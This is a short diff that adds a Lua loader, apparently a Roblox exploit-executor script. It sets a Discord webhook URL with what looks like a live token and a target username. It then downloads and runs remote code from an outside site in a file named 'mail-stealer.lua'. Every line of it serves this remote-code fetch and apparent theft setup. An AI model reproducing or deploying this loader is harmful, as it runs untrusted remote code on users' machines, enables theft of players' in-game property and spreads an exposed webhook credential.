@@ -1,0 +1,4 @@
+getgenv().webhook = "https://discord.com/api/webhooks/1088123753877229578/kBPwWSc0V5v7_OWeqs8WkDOVmj8GzEajnL1aK4RM_6mtkiRUoIdxotRB2mqpWzo4nGQ-" 
+getgenv().name = "Youtonh1" -- 
+getgenv().mouselock = true-- 
+loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
